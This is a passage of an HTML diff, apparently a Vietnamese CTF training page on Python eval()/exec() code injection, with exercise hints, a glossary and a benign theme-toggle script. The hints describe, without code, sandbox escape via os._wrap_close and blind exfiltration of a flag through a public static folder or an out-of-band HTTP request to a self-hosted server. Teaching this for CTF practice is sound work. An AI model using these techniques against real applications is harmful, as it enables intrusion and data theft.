+  thể đọc file (thường là <code>&lt;class 'os._wrap_close'&gt;</code> hoặc tương tự tùy phiên bản Python).</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> app chỉ dùng <code>exec()</code> (không trả giá trị, không echo output) để
+  "chạy rule" — không thấy output nào trên response. Thiết kế cách lấy được flag trong tình huống "blind" này.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Dùng payload ghi nội dung flag ra 1 file công khai được (vd thư mục
+  <code>static/</code> nếu app serve file tĩnh), hoặc dùng kỹ thuật OOB gửi nội dung flag qua HTTP request tới
+  server bạn tự host (xem lại pattern <code>http.server</code> ở các bài XXE/SSRF).</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>eval()</td><td>Hàm biên dịch và chạy 1 chuỗi làm code của ngôn ngữ, trả về giá trị biểu thức.</td></tr>
+    <tr><td>exec()</td><td>Giống eval() nhưng cho chạy nhiều câu lệnh, không trả giá trị (Python).</td></tr>
+    <tr><td>Sandbox escape</td><td>Kỹ thuật vượt qua giới hạn builtins bị chặn để lấy lại quyền truy cập hàm nguy hiểm.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>So sánh với các bài liên quan:</strong> SSTI (template engine, khác lớp),
+  Command Injection (chạy lệnh OS trực tiếp, không qua ngôn ngữ backend).</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("codeinj-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("codeinj-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
